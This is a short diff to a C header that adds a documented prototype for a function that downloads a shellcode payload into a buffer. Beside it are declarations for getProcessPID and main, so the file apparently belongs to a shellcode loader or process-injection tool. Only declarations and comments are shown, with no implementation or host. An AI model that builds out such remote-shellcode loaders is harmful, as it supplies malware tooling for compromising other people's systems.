@@ -201,4 +201,15 @@ DWORD getProcessPID(const char* processName);
  */
 BOOL main();
 
+/**
+ * @brief Downloads a shellcode payload into the provided buffer.
+ *
+ * @param shellcode Pointer to a buffer where the downloaded shellcode will be stored.
+ * @param limit The known size of the downloaded shellcode.
+ *
+ * @return BOOL Returns TRUE if the shellcode was successfully downloaded into the buffer,
+ *              otherwise returns FALSE.
+ */
+BOOL downloadPayload(unsigned char* shellcode, size_t limit);
+
 #endif
